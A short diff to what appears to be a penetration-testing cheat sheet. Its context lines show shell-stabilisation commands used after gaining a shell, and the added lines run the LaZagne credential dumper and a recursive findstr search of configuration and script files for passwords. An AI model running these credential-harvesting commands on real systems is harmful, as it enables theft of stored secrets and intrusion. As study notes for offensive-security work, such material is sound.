@@ -17,3 +17,7 @@ WinExec("<result>")
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 stty raw -echo; fg
 export TERM = xterm
+
+----------scan files---------
+Use tool: start lazagne.exe all
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
